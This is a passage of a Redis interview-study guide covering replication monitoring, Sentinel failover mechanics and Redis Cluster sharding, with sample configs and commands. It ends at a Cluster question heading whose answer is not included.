The classic Redis outage. Suppose a **replica runs with persistence disabled** (no RDB, no AOF) — sometimes done "to make it fast." Now that replica process **restarts** (crash, deploy, OOM). It comes back with an **empty dataset** because it persisted nothing. If it's configured to **auto-restart and immediately rejoin as a replica**, it connects to the primary, and — depending on the failover/config setup — an **empty node can end up being promoted** or a full-sync direction can propagate emptiness. In the worst configurations (especially with automatic failover), the empty node's state can be replicated **onto the primary**, and the whole cluster's data is **wiped**.

The mechanism antirez warned about: replica restarts empty → participates in replication/failover → emptiness propagates. The fix: **never run a replica without persistence if it can auto-restart and rejoin**, or ensure a restarted empty node **cannot** be promoted / cannot push its empty state upstream. Keep at least RDB on replicas, or gate restarts through a supervisor that resyncs from the primary rather than coming up empty-and-eligible.

### Q13. What is chained replication (replica of a replica)?

A replica can itself be the **primary for other replicas** — replica B replicates from primary A, and replica C replicates from B. This forms a **replication tree** instead of a star. The point is to **offload the fan-out cost**: if you have many replicas, having them all sync from and stream off the single top primary loads that primary (CPU, network, and a fork per full sync). Chaining lets an intermediate replica absorb some of that fan-out, so the top primary only feeds a few sub-primaries.

Sub-replicas can even be configured to serve reads while relaying the stream downstream. The trade-off is **added latency and lag**: data now traverses more hops (A→B→C), so C is further behind real-time than a direct replica, and a failure of an intermediate node affects everything below it. Use chained replication when you have enough replicas that direct fan-out strains the primary; otherwise keep it flat for lower lag and simpler topology.

### Q14. How do you monitor replication and detect lag?

Use `INFO replication` on both sides. On the **primary** it lists connected replicas, each with its acked offset, and the primary's own `master_repl_offset`. On a **replica** it shows `master_link_status` (up/down), `master_last_io_seconds_ago`, and `slave_repl_offset`.

```bash
INFO replication
# primary: role:master, connected_slaves:2, slaveN:...,offset=..., master_repl_offset:...
# replica: role:slave, master_link_status:up, slave_repl_offset:...
```

**Lag** is essentially `master_repl_offset` (primary) minus the replica's applied offset — the number of bytes of stream the replica hasn't caught up on yet. Watch for: a **growing** offset gap (replica falling behind — network, slow replica, big writes), `master_link_status:down` (replication broken), and a rising `master_last_io_seconds_ago` (no recent data from the primary). Alert on sustained lag because it widens the failover data-loss window and makes replica reads staler. `master_link_status` and repeated full resyncs (visible in logs) are your early-warning signs that replication is unhealthy.

### Q15. How do replication, Sentinel, and Cluster relate? And how do you promote a replica?

Think of it as **mechanism vs automation**:

- **Replication** is the underlying **data-copy mechanism** — primary streams writes to replicas. On its own it does **not** do automatic failover; if the primary dies, *something* must notice and promote a replica.
- **Sentinel** is the automation for a **non-sharded** setup: a set of Sentinel processes **monitor** the primary and replicas, reach **quorum** that the primary is down, elect a leader, **automatically promote** a replica to primary, and reconfigure the others and notify clients. Replication is what makes the promoted replica a viable new primary.
- **Cluster** adds **horizontal sharding** — data is split across 16384 hash slots over many primary/replica groups — and also handles failover **within** each group. Use it when the dataset or write throughput exceeds one primary.

**Manual promotion** (when you're not using Sentinel/Cluster, or doing controlled maintenance): on the chosen replica run `REPLICAOF NO ONE` — it stops replicating and becomes a standalone primary, keeping its current data. Then repoint the other replicas at it (`REPLICAOF <new-primary> <port>`) and update clients. In interviews: replication is the foundation, Sentinel/Cluster automate failover on top of it, and `REPLICAOF NO ONE` is the manual promote.
## High Availability: Sentinel

### Summary

**What this topic covers**

How Redis stays available when a single primary node dies — **without sharding**. This topic is about **Redis Sentinel**: a separate distributed system of processes whose entire job is to watch a primary–replica group, agree when the primary is dead, and promote a replica automatically. The 15 questions here cover what Sentinel is and its three responsibilities (monitoring, notification, automatic failover, plus acting as a configuration provider), the failover state machine (SDOWN → ODOWN → leader election → promotion → reconfiguration), the `quorum` parameter, why you run an odd number of Sentinels across failure domains, how clients discover the current primary, the data-loss window inherent to async replication, split-brain and old-primary-returns handling, TILT mode, and — the decision every candidate must get right — **Sentinel vs Cluster**. If you can answer "how does Redis achieve automatic failover?" cleanly, you've mastered this topic.

**Mental model**

Think of Sentinel as an **external supervisor plane** sitting beside your data plane. Your data plane is one primary and N replicas doing async replication (the [[replication]] topic). None of those nodes can safely promote themselves — a replica can't tell "the primary died" from "I can't reach the primary" (a network partition), and if two replicas both promoted you'd get split-brain. So you add a *third* set of processes — the Sentinels — whose only job is to observe and coordinate. Sentinels gossip with each other and with the data nodes. When enough of them independently agree the primary is unreachable, they elect one Sentinel as leader (a Raft-like election), and that leader orchestrates the failover: pick the best replica, run `REPLICAOF NO ONE` on it to make it a primary, and tell every other replica to follow the new primary. Clients don't hardcode the primary's address — they **ask the Sentinels** "who is the primary for `mymaster` right now?" and reconnect there. The key insight: Sentinel adds availability, not consistency — it does not close the async-replication data-loss window.

**Key terms**

- **Sentinel** — a special Redis process (`redis-sentinel` / `redis-server --sentinel`) that monitors primaries and replicas and orchestrates failover. Not a proxy — data never flows through it.
- **SDOWN (Subjectively Down)** — one Sentinel's private opinion that the primary is down, declared after `down-after-milliseconds` of no valid PING reply.
- **ODOWN (Objectively Down)** — the agreed verdict that the primary is down, reached once a **quorum** of Sentinels each report SDOWN. Only ODOWN triggers failover.
- **quorum** — the number of Sentinels that must agree the primary is down to *start* a failover. Distinct from the majority needed to *authorize* it.
- **Leader Sentinel** — the single Sentinel elected (Raft-style) to actually run one failover, preventing multiple concurrent promotions.
- **Configuration provider** — Sentinel's role as service discovery: clients query it for the current primary address.
- **`replica-priority`** — per-replica promotion weight; lower = preferred, `0` = never promote.
- **`parallel-syncs`** — how many replicas re-sync from the new primary simultaneously after failover.
- **`failover-timeout`** — how long a failover attempt may run before it's considered failed and retried.
- **TILT mode** — a self-protection state a Sentinel enters when it detects clock jumps / its own timing is unreliable; it stops acting for a while.
- **Split-brain** — two nodes both believing they're primary; Sentinel's quorum + majority rules are designed to avoid it.

**Why interviewers ask this**

HA is where "I've used Redis" separates from "I've operated Redis." A junior answer is "Sentinel makes Redis highly available." A senior answer walks the failover state machine (SDOWN vs ODOWN, quorum vs majority, leader election) and — crucially — knows the **limits**: failover does not prevent data loss because replication is async, and Sentinel is *not* sharding. The single most common decision question is "would you use Sentinel or Cluster here?" and getting it right (dataset fits on one node → Sentinel; too big / need to scale writes → Cluster) signals you understand the actual trade space rather than reaching for the fanciest option. Interviewers also probe operational judgement: how many Sentinels, where you place them, and why an even number or co-locating all Sentinels in one rack defeats the purpose.

**Common confusions**

- "Sentinel shards data" — no. Sentinel is HA for a **single, non-sharded** dataset. Sharding is [[redis-cluster]].
- "Clients connect through Sentinel" — no. Sentinel is a *directory*, not a proxy. Clients ask Sentinel for the primary's address, then connect directly to the data node.
- "Quorum is the number of Sentinels needed to do the failover" — quorum only triggers ODOWN. The *promotion* still needs a majority of the total Sentinel set to authorize a leader.
- "Failover means no data is lost" — async replication means writes acked by the old primary but not yet replicated are **lost** on promotion.
- "Two Sentinels is enough" — you need an odd number ≥ 3 across failure domains so a partition can't leave two equal halves.
- "The old primary is gone forever" — when it comes back, Sentinel reconfigures it as a **replica** of the new primary.

**What follows from this topic**

Sentinel builds directly on [[replication]] — it's the automation layer on top of primary–replica. It contrasts with [[redis-cluster]], which folds failover *into* the cluster and adds sharding, so no Sentinel is needed there. The data-loss window here is the same one discussed under [[persistence]] and `WAIT`. Once you understand Sentinel, the Cluster topic is "what if the data doesn't fit on one node?" — and the memory topic ([[memory-management-optimization]]) is often *why* it doesn't.

### Q1. What is Redis Sentinel and what problem does it solve?

**Redis Sentinel** is a separate distributed system — a set of `redis-sentinel` processes — that provides **automatic failover, monitoring, and service discovery** for a **non-sharded** Redis primary–replica deployment.

The problem: plain replication (primary → replicas, async) gives you read scaling and a warm standby, but if the primary dies, *nothing promotes a replica automatically*. A human has to notice, pick a replica, run `REPLICAOF NO ONE`, and repoint every client. Sentinel automates exactly that.

It has three jobs: **Monitoring** (continuously check that the primary and replicas are alive), **Notification** (alert operators/systems when something goes wrong), and **Automatic failover** (detect a dead primary, elect a replacement, promote it, and reconfigure the rest). A fourth role falls out of this: **configuration provider** — clients ask Sentinel "who is the current primary?" rather than hardcoding an address.

Crucially, Sentinel is **not** a proxy and **not** sharding. Data never flows through it, and it manages a single logical dataset that fits on one node.

### Q2. What are the three (or four) responsibilities of Sentinel?

1. **Monitoring** — every Sentinel PINGs the primary and its replicas (and gossips with other Sentinels) to track who's alive.
2. **Notification** — via `sentinel notification-script` or Pub/Sub events, Sentinel can notify an admin or automation when a monitored instance changes state.
3. **Automatic failover** — if the primary is judged dead, Sentinels agree, elect a leader, promote the best replica, and reconfigure the other replicas and clients to use it.
4. **Configuration provider (service discovery)** — clients connect to Sentinels to *discover* the current primary and re-query after a failover, so they always find the live primary without redeploying config.

### Q3. Walk me through exactly how a Sentinel failover works.

Step by step:

1. A Sentinel stops getting valid PING replies from the primary for `down-after-milliseconds`. It marks the primary **SDOWN (Subjectively Down)** — its private opinion.
2. It asks the other Sentinels for their view. Once at least **`quorum`** Sentinels agree the primary is down, they mark it **ODOWN (Objectively Down)**. Only ODOWN triggers a failover.
3. The Sentinels run a **leader election** (Raft-like); a majority of the full Sentinel set must authorize one Sentinel as the leader for this failover. This prevents two Sentinels promoting two different replicas.
4. The leader picks the **best replica** — filtering out disconnected/unhealthy ones, then ranking by `replica-priority` (lower wins, `0` excluded), then by replication offset (most up-to-date), then by lexicographically smallest run-id as a tiebreaker.
5. It promotes that replica with `REPLICAOF NO ONE`.
6. It reconfigures the remaining replicas to `REPLICAOF <new-primary>` (throttled by `parallel-syncs`).
7. It updates its state so clients querying Sentinel now get the new primary. When the old primary returns, it's reconfigured as a **replica** of the new one.

### Q4. What is the difference between SDOWN and ODOWN?

- **SDOWN (Subjectively Down)** is *one* Sentinel's local judgement: "I personally haven't heard a valid reply from the primary within `down-after-milliseconds`." It's subjective because a single Sentinel might just be partitioned from the primary.
- **ODOWN (Objectively Down)** is the *collective* verdict: enough Sentinels — at least the configured **`quorum`** — each independently report SDOWN, so together they conclude the primary really is down.

Only **ODOWN** authorizes a failover. This two-stage design prevents a single Sentinel with a bad network link from triggering an unnecessary failover — you need agreement before anyone acts.

### Q5. What is the `quorum` parameter, and how is it different from the majority needed to authorize a failover?

`quorum` (set in `sentinel monitor mymaster <ip> <port> <quorum>`) is the number of Sentinels that must agree the primary is down to **reach ODOWN and start** a failover.

But starting isn't enough: to actually *perform* the failover, a Sentinel must be **elected leader by a majority of the entire Sentinel set** — not just `quorum`. These are two separate thresholds:

- **quorum** — triggers the *decision* that the primary is down.
- **majority** — authorizes *one Sentinel* to carry out the promotion.

Example: with 5 Sentinels and `quorum = 2`, two Sentinels can declare ODOWN, but a leader still needs 3 votes (majority of 5) to run the failover. This is deliberate: it means a small partitioned group can *think* the primary is down but can't unilaterally promote, avoiding split-brain.

### Q6. Why should you run an odd number of Sentinels, and at least three, across failure domains?

Two reasons, both about **avoiding split-brain and keeping a majority**:

- **Majority requires more than half.** With an even number (say 4), a partition can split them 2–2 and neither side has a majority (3) to authorize a failover — you get no failover when you need one. An odd number (3, 5) means one side of any partition can still hold a majority.
- **At least 3** so that losing one Sentinel still leaves a functioning majority (2 of 3).

And **across failure domains** (different hosts/racks/AZs): if all three Sentinels sit in one rack and that rack loses power, you lose your entire supervision plane at once. Spreading them means a single-domain failure can't take out the majority.

A classic safe topology: 3 Sentinels in 3 availability zones, monitoring 1 primary + 2 replicas.

### Q7. How do clients discover the current primary, and what happens on failover?

Clients do **not** hardcode the primary's address. Instead they use a **Sentinel-aware client library** that:

1. Connects to one or more Sentinels and asks: `SENTINEL get-master-addr-by-name mymaster`.
2. Connects directly to the returned primary address for normal reads/writes.
3. Subscribes to Sentinel's Pub/Sub `+switch-master` events (or re-queries) so that on a failover it learns the new primary and reconnects.

```bash
# What the client library does under the hood
SENTINEL get-master-addr-by-name mymaster
# => 1) "10.0.0.12"  2) "6379"
```

So the flow on failover is: Sentinels promote a replica → publish `+switch-master` → clients see it (or their next connection attempt to the dead primary fails and they re-ask Sentinel) → clients reconnect to the new primary. This is why you point clients at the **Sentinels**, not directly at a Redis node.

### Q8. Show a minimal Sentinel configuration and explain the key directives.

```bash
# sentinel.conf
port 26379
sentinel monitor mymaster 10.0.0.10 6379 2
sentinel down-after-milliseconds mymaster 5000
sentinel failover-timeout mymaster 60000
sentinel parallel-syncs mymaster 1
sentinel auth-pass mymaster s3cr3t
```

- `sentinel monitor mymaster <ip> <port> <quorum>` — monitor a primary named `mymaster` at that address; `2` is the quorum. Sentinel auto-discovers the replicas and other Sentinels from the primary.
- `down-after-milliseconds` — how long without a valid reply before this Sentinel declares SDOWN (here 5s).
- `failover-timeout` — max time a failover attempt may take before it's aborted/retried.
- `parallel-syncs` — how many replicas re-sync from the new primary at once (1 = one at a time, so the group isn't all cold simultaneously).
- `auth-pass` — password Sentinel uses to talk to the data nodes.

Note you only configure the **primary's** address — Sentinel discovers replicas and peer Sentinels automatically via the primary's `INFO` and Pub/Sub.

### Q9. What is `replica-priority` and how does it affect promotion?

`replica-priority` (a per-replica setting, in `redis.conf`) controls how eligible a replica is to be promoted:

- Lower number = **higher** priority (more likely to be chosen).
- The default is 100.
- **`0` means "never promote this replica"** — Sentinel will treat it as an unpromotable node (useful for a replica dedicated to backups, analytics, or in a distant DR region you don't want serving writes).

During failover the leader Sentinel filters out priority-0 replicas, then among the rest prefers the lowest priority value, then the most up-to-date replication offset, then the smallest run-id. So `replica-priority` lets you *steer* which replica becomes primary — e.g. keep failover within the local AZ by giving remote replicas priority 0.

### Q10. Does Sentinel failover guarantee no data loss? Explain the window.

**No.** Redis replication is **asynchronous**: the primary acknowledges a write to the client *before* it's confirmed on the replicas. So there's a window where writes are acked to clients but not yet replicated.

If the primary dies in that window and a replica is promoted, those un-replicated writes are **lost** — the new primary never saw them. Failover restores *availability*, not those writes.

Mitigations reduce but don't eliminate this:

- `min-replicas-to-write` / `min-replicas-max-lag` — refuse writes unless enough replicas are caught up (trades availability for durability).
- The `WAIT numreplicas timeout` command — block until a write reaches N replicas.

But fundamentally, if you need *zero* data loss you can't rely on async replication + automatic failover. Interviewers love this: "Sentinel gives you HA, not a durability guarantee."

### Q11. What happens when the old primary comes back after a failover? How is split-brain avoided?

When the failed primary recovers, the Sentinels detect it and **reconfigure it as a replica** of the new primary (`REPLICAOF <new-primary>`). It does not resume as primary. Any writes it took while isolated that never replicated are discarded when it re-syncs from the new primary.

Split-brain (two primaries accepting writes) is mitigated by design:

- A failover only happens on **ODOWN** (quorum agreement) plus a **majority-elected leader** — a minority partition can't promote.
- On the data side, `min-replicas-to-write` can make an isolated old primary **stop accepting writes** when it can't reach enough replicas, shrinking the window where a stale primary takes writes clients think are durable.

It's mitigation, not a hard guarantee — a client still talking to the isolated old primary before `min-replicas` kicks in can write to a node that's about to be demoted.

### Q12. Sentinel vs a load balancer in front of Redis — what's the difference?

A load balancer distributes connections across backends but has **no understanding of Redis roles** — it doesn't know which node is the primary, can't promote a replica, and would happily send writes to a read-only replica. It also can't perform the coordinated state machine (agree on death, elect a leader, run `REPLICAOF NO ONE`, reconfigure replicas).

Sentinel is **Redis-role-aware orchestration + service discovery**. It knows primary vs replica, decides when to fail over, performs the promotion, and tells clients where the new primary is.

You sometimes *combine* them: some setups put a proxy/LB (or a floating VIP) that Sentinel updates on failover, so clients that can't speak the Sentinel protocol still reach the right node. But the LB alone can never replace Sentinel's decision-making.

### Q13. When would you choose Sentinel over Redis Cluster? (The key decision.)

The deciding question is **"does my dataset fit comfortably on a single node, and do I need to scale writes/memory across nodes?"**

| | Sentinel | Cluster |
|---|---|---|
| Purpose | HA for a **single, non-sharded** dataset | **Sharding** (horizontal scale) + HA |
| Data size | Fits on one node | Too big for one node / needs write scaling |
| Sharding | No | Yes — 16384 hash slots |
| Failover | External Sentinels | Built-in (gossip-based), no Sentinel |
| Multi-key ops | Fully supported | Only within one slot (hash tags) |
| Client | Sentinel-aware | Cluster-aware (MOVED/ASK) |
| Complexity | Lower | Higher |

**Choose Sentinel** when your data fits on one machine and you just need automatic failover — it's simpler and keeps full multi-key/transaction support. **Choose Cluster** ([[redis-cluster]]) when the data is too big for one node or you need to spread write load. Don't reach for Cluster's complexity just for HA on a small dataset.

### Q14. What is TILT mode, and why does Sentinel need it?

Sentinel's failure detection depends heavily on **timing** — measuring elapsed time between PINGs. If the underlying clock jumps (the process was paused, the VM was suspended, NTP stepped the clock, heavy swapping), those time measurements become meaningless and a Sentinel could wrongly conclude the primary is down.

**TILT mode** is a self-protection state: if a Sentinel notices that the time between its internal iterations is negative or implausibly large, it enters TILT for a configured period (`sentinel-tilt-period`, default 30s). While in TILT it keeps monitoring and receiving messages but **refuses to act** — it won't start or vote in failovers — until it's confident its timing is reliable again.

It's essentially "I don't trust my own clock right now, so I'll sit this one out." This prevents a hiccuping node from triggering spurious failovers.

### Q15. How does Redis achieve automatic failover — give the concise senior answer?

Redis achieves automatic failover for a non-sharded deployment with **Sentinel**, a separate quorum-based supervisor system:

1. **Detection** — each Sentinel independently PINGs the primary; missing replies for `down-after-milliseconds` → **SDOWN**. When a **quorum** of Sentinels agree → **ODOWN**.
2. **Coordination** — the Sentinels elect a **leader** by majority (Raft-like), so exactly one drives the failover.
3. **Promotion** — the leader selects the healthiest, most up-to-date replica (by `replica-priority`, then replication offset) and runs `REPLICAOF NO ONE`.
4. **Reconfiguration** — remaining replicas are pointed at the new primary; the old primary, when it returns, is demoted to a replica.
5. **Discovery** — clients, using a Sentinel-aware library, re-query Sentinel and reconnect to the new primary.

The honest caveat: because replication is **async**, failover restores availability but can **lose** the last un-replicated writes. For sharded datasets, this same responsibility is built into **Cluster** instead of Sentinel.

## Redis Cluster

### Summary

**What this topic covers**

How Redis scales **horizontally** — sharding a dataset across many nodes — while staying highly available, all built into Redis itself with no external coordinator. This topic is **Redis Cluster**: the 16384-hash-slot model, how keys map to slots (`CRC16(key) mod 16384`), how cluster-aware clients route requests and handle `MOVED`/`ASK` redirects, resharding, the multi-key `CROSSSLOT` constraint and **hash tags** to co-locate related keys, built-in gossip-based failure detection and failover (replicas per master, no Sentinel needed), the cluster bus, availability semantics, the introspection commands (`CLUSTER INFO/NODES/SLOTS`), what you *lose* by using Cluster, and the recurring decision **Cluster vs Sentinel**. The 16 questions build toward answering "how does Redis scale horizontally?"

**Mental model**

Picture the keyspace pre-divided into **16384 numbered buckets** — the hash slots. Every key deterministically belongs to exactly one slot: `slot = CRC16(key) mod 16384`. Each **master node owns a contiguous-ish set of slots** (e.g. node A owns 0–5460, B owns 5461–10922, C owns 10923–16383). There is **no central proxy** deciding where a key lives — the mapping is pure math, and the *nodes themselves* know who owns what and gossip that map around on a separate **cluster bus** port. The client is smart: it caches the slot→node map and sends each command straight to the owning node. If it's wrong (the map changed), the node replies `MOVED` (permanent — update your map) or `ASK` (temporary — this slot is mid-migration). HA is folded in: each master has replica(s), and the cluster's own gossip-based failure detection promotes a replica if a master dies — **no Sentinel**. The mental shift from Sentinel: Cluster is about *where the data lives* (many nodes, sharded) as well as *staying up*, whereas Sentinel is only about staying up for data that lives on one node.

**Key terms**

- **Hash slot** — one of **16384** logical buckets the keyspace is split into; sharding unit. `slot = CRC16(key) mod 16384`.
- **Shard / master** — a node owning a subset of slots and serving reads/writes for them.
- **Cluster-aware (smart) client** — a client that caches the slot→node map and routes commands directly, handling redirects.
- **MOVED** — a redirect meaning "this slot permanently lives on node X; update your map and retry there."
- **ASK** — a redirect during slot migration meaning "for this one request, ask node X (send `ASKING` first)"; temporary, don't update your map.
- **Resharding** — moving slots (and their keys) between nodes to add/remove capacity, done live.
- **CROSSSLOT error** — raised when a multi-key command touches keys in different slots.
- **Hash tag** — the `{...}` substring; only what's inside braces is hashed, forcing related keys into the same slot.
- **Cluster bus** — a separate node-to-node binary protocol/port for gossip, failure detection, and config propagation.
- **Gossip protocol** — how nodes exchange health/config state without a central coordinator.
- **Failover (Cluster)** — automatic promotion of a replica when its master is detected failed, run by the cluster itself.

**Why interviewers ask this**

Cluster is the "can you scale Redis past one box?" question, and it's rich in gotchas that reveal depth. Juniors say "Cluster just adds more nodes." Seniors know the **16384 slots**, the `CRC16 mod` mapping, and — the real differentiator — the **multi-key constraint**: you *cannot* run `MSET`, a transaction, or a Lua script across keys in different slots, so you must design keys with **hash tags** to co-locate related data. That single point tells an interviewer whether you've actually run Cluster in production or just read that it shards. They also probe the **Cluster vs Sentinel** decision (scale+shard vs single-dataset HA), MOVED vs ASK (do you understand live migration?), and consistency (Cluster is still async-replicated, so it has the same failover data-loss window — it is *not* strongly consistent). Getting the "what do you lose" answer right (no cross-slot ops, only DB 0, restricted commands) shows engineering maturity: you know Cluster is a trade-off, not a free upgrade.

**Common confusions**

- "There are 16384 nodes" — no, **16384 slots**, distributed across a handful of nodes. A node owns thousands of slots.
- "A proxy routes keys to shards" — no central proxy; the **client** routes using the cached slot map, corrected by MOVED/ASK.
- "MOVED and ASK are the same" — MOVED is permanent (update your map); ASK is temporary, per-request, during migration (send `ASKING` first).
- "I can use transactions/Lua across any keys" — only if all keys are in the **same slot**; otherwise `CROSSSLOT`. Use hash tags.
- "Cluster needs Sentinel for failover" — no. Cluster has its own gossip-based failure detection and failover.
- "Cluster is strongly consistent" — no. Replication is still async, so a failover can lose recent writes, same as Sentinel.
- "Hash tags hash the whole key differently" — only the substring **inside the braces** is hashed; the rest of the key is ignored for slot placement.

**What follows from this topic**

Cluster is the horizontal-scaling counterpart to [[high-availability-sentinel]] — it *includes* HA (replica promotion) so you don't run Sentinel with it. It leans on [[replication]] (each shard is a mini primary–replica group) and inherits that topic's async data-loss window. The multi-key/hash-tag constraint reshapes how you use [[transactions]] and Lua. And you often reach for Cluster precisely because of [[memory-management-optimization]] — the data no longer fits (or the write load no longer fits) on one node.

### Q1. What is Redis Cluster and what problem does it solve?

**Redis Cluster** is Redis's built-in solution for **horizontal scaling (sharding) plus high availability**, with no external coordinator.

It solves two problems that plain replication and Sentinel can't:

1. **Data too big for one node** — a single Redis instance is bounded by one machine's RAM. Cluster splits the keyspace across many masters so total capacity is the sum of the nodes.
2. **Write/throughput scaling** — replication scales *reads* (add replicas) but all writes still hit one primary. Cluster spreads writes across multiple masters.

It shards using **16384 hash slots** distributed across master nodes, and each master has replica(s) with **automatic, built-in failover** — so Cluster is sharding and HA together. The trade-off is a more constrained programming model (multi-key ops must stay within a slot, only DB 0, some commands restricted).

### Q2. Explain the 16384 hash slot model. How does a key map to a node?

The keyspace is statically divided into **16384 hash slots**. Every key maps to exactly one slot:

```
slot = CRC16(key) mod 16384
```

Each **master node owns a subset of the slots** (roughly evenly divided). To find which node serves a key, you compute its slot, then look up which node currently owns that slot.

Example with 3 masters:

```bash
# Node A: slots 0     - 5460
# Node B: slots 5461  - 10922
# Node C: slots 10923 - 16383
```

Key points:

- Sharding is **by slot, not by a central proxy** — the mapping is deterministic math, and nodes gossip who owns which slots.
- Slots (not individual keys) are the unit of movement: to rebalance, you move *slots* (with their keys) between nodes.
- 16384 is a fixed constant (chosen so the slot bitmap gossiped between nodes stays small — 2KB).

### Q3. How does a client find the right node? Explain MOVED and ASK.

A **cluster-aware (smart) client** caches the **slot → node** map. For each command it computes the key's slot and sends the command directly to the owning master. When its cached map is wrong, the node redirects it:

- **`MOVED <slot> <ip:port>`** — *permanent*: "that slot now lives on this other node." The client **updates its cached map** and retries there. Happens after a reshard completed.
- **`ASK <slot> <ip:port>`** — *temporary*, during a live slot migration: "this specific key has already moved; for *this request* go ask that node." The client sends `ASKING` then the command to the target, but does **not** update its map (the slot as a whole hasn't finished moving).

```bash
GET user:{123}:profile
# (error) MOVED 5798 10.0.0.11:6379   -> update map, retry on that node
```

So MOVED = "fix your map," ASK = "one-off detour while a slot is mid-migration." A good client rarely gets redirected because it keeps its map fresh via `CLUSTER SLOTS`.

### Q4. What is resharding and how is it done live?

**Resharding** is moving hash slots — and the keys they contain — between nodes, to add capacity (new node takes some slots), remove a node (its slots go elsewhere), or rebalance.

It's done **live**, without downtime, with `redis-cli`:

```bash
redis-cli --cluster reshard 10.0.0.10:6379
redis-cli --cluster add-node 10.0.0.13:6379 10.0.0.10:6379
redis-cli --cluster rebalance 10.0.0.10:6379
```

During migration of a slot, keys are moved incrementally from the source to the destination node. While that slot is in-flight:

- Keys already moved trigger an **ASK** redirect to the destination.
- Keys not yet moved are served by the source.

Once all keys for the slot are moved and ownership is switched, the source starts replying **MOVED** for that slot, and clients update their maps. This ASK/MOVED interplay is what makes resharding transparent to clients.

### Q5. Why can't I run a multi-key command across arbitrary keys in a cluster?

Because a command touching multiple keys must be executed on **one node**, and Redis routes by slot. If two keys hash to **different slots** (likely on different nodes), Redis can't run the command atomically on a single node, so it refuses with a **`CROSSSLOT`** error:

```bash
MSET user:1 alice user:2 bob
# (error) CROSSSLOT Keys in request don't hash to the same slot
```

This applies to **all multi-key operations**: `MSET`/`MGET`, `SINTERSTORE`, `SUNIONSTORE`, `MULTI/EXEC` transactions spanning keys, and Lua scripts that touch multiple keys. Each of those requires **all involved keys to live in the same slot**.

The fix is **hash tags** (next question): design keys so related ones share a slot. This constraint is the single biggest change to how you program against Cluster vs a single instance.

### Q6. What are hash tags and how do they solve the multi-key constraint?

A **hash tag** lets you control which part of a key determines its slot. If a key contains a substring in **curly braces `{...}`**, only that substring is hashed:

```
slot = CRC16(substring-inside-first {…}) mod 16384
```

So keys with the same tag land in the **same slot**, guaranteeing they're on the same node and can be used together in multi-key ops:

```bash
SET user:{123}:profile  "..."
SET user:{123}:sessions "..."
# Both hash on "123" -> same slot -> multi-key ops work:
MGET user:{123}:profile user:{123}:sessions   # OK, same slot
```

Design rule: put the **entity id you group by** inside braces (`order:{456}:items`, `order:{456}:total`) so all data for that entity co-locates. Caveat: over-using a single tag creates a **hot slot** — everything with `{123}` sits on one node, which can become a bottleneck or a big-key hotspot. Tag by the natural grouping unit, not something so coarse it defeats sharding.

### Q7. How does high availability work within a cluster? Do I need Sentinel?

**No Sentinel needed** — HA is built into Cluster.

Each master has one or more **replicas**. The cluster nodes continuously monitor each other via the **gossip protocol** on the cluster bus. When a master is detected as failed:

1. Nodes mark it PFAIL (possible failure), then FAIL once enough masters agree (gossip-propagated).
2. One of its replicas initiates a failover, requesting votes from the **master nodes**.
3. A **majority of masters** authorize the promotion; the replica runs the promotion and takes over the failed master's slots.
4. Clients get **MOVED** to the new master for those slots.

So Cluster has its **own** failure detection and failover — analogous to Sentinel's job, but folded into the data nodes themselves. This is a key contrast with [[high-availability-sentinel]]: with Cluster you don't deploy Sentinel at all.

### Q8. What is the cluster bus and gossip protocol?

The **cluster bus** is a separate node-to-node communication channel — a second TCP port (by default the client port + 10000, e.g. 16379 for 6379) using a compact binary protocol.

Over it, nodes run a **gossip protocol**: each node periodically exchanges messages with a subset of other nodes carrying:

- Health/reachability info (who's PFAIL/FAIL — used for failure detection).
- The slot ownership map / configuration epoch (so everyone converges on who owns which slots).
- Failover votes and configuration updates.

Because it's gossip, there's no central coordinator — state propagates peer-to-peer and the cluster self-organizes. Practically: make sure the cluster-bus port is open between all nodes, or the cluster can't form or detect failures. It's separate from the client port so ordinary client traffic and internal coordination don't interfere.

### Q9. What are the availability semantics of a cluster? When does it stop serving?

A Redis Cluster keeps serving as long as, roughly, **a majority of masters are reachable AND every slot has a live owner**. More precisely:

- If a master and **all its replicas** fail, the slots it owned have **no live owner** → those slot ranges become **unavailable** (requests to them error), even though the rest of the cluster serves fine.
- `cluster-require-full-coverage` (default `yes`) makes the *whole* cluster stop accepting writes if *any* slot is uncovered. Set it to `no` to keep serving the covered slots while some are down.
- A master minority partition (can't reach a majority of masters) will stop accepting writes on its side to avoid split-brain.

So availability is **per-slot**: losing one shard's master+replicas takes out that key range, not the entire dataset (unless full-coverage is required). This is why you give every master at least one replica in a different failure domain.

### Q10. What are CLUSTER INFO, CLUSTER NODES, and CLUSTER SLOTS for?

They're the introspection commands for operating and debugging a cluster:

```bash
CLUSTER INFO     # cluster-wide health: state:ok, slots_assigned, known_nodes, size
CLUSTER NODES    # one line per node: id, ip:port, flags (master/slave), master-id, link state, slots owned
CLUSTER SLOTS    # slot ranges -> owning master + its replicas (what smart clients call to build their map)
CLUSTER SHARDS   # (7.0+) richer per-shard view of slots and nodes
CLUSTER KEYSLOT user:{123}:x   # which slot a given key maps to
```

- **CLUSTER INFO** — is the cluster healthy (`cluster_state:ok`) and are all 16384 slots assigned?
- **CLUSTER NODES** — full topology: roles, replication links, slot ownership. Your go-to for "what does the cluster think its layout is?"
- **CLUSTER SLOTS** — the machine-readable slot→node map that cluster-aware clients fetch to route requests. `CLUSTER SHARDS` supersedes it on 7.0+.

### Q11. What is the minimum viable cluster, and why?

The minimum recommended cluster is **3 masters, usually plus 3 replicas (6 nodes total)**.

Why 3 masters:

- Failover and configuration changes require a **majority of masters** to vote. With only 2 masters, a single failure leaves no majority (1 of 2 isn't a majority), so failover can't be authorized. **3 masters** means a majority (2) survives one master failure.

Why replicas:

- Without a replica, a failed master's slots have no one to promote → that slot range goes offline. Giving each master a replica (in a different failure domain) lets the cluster auto-promote and keep serving.

So while Redis technically lets you start a cluster with fewer masters and no replicas, **3 masters + 1 replica each** is the smallest topology that actually gives you both working failover and HA. Fewer than 3 masters defeats the majority-voting model.

### Q12. Is Redis Cluster strongly consistent? What can you lose?

**No — Cluster is not strongly consistent.** Replication between a master and its replicas is still **asynchronous**: a master acks a write to the client before it's confirmed on replicas. So the **same failover data-loss window** as Sentinel/replication applies — if a master dies with un-replicated writes and a replica is promoted, those writes are lost.

Additional loss scenarios specific to Cluster:

- During a network partition, a master in the **minority** side keeps accepting writes for a short window (`cluster-node-timeout`) before it detects it's isolated and stops. Those writes can be lost when the majority side promotes a replica.

Mitigations: `min-replicas-to-write` and `WAIT` reduce the window but don't eliminate it. So Cluster gives you **scale + HA**, not linearizability. If you need strong consistency, Redis isn't the right primary store for that data.

### Q13. What do you lose or give up by moving to Redis Cluster?

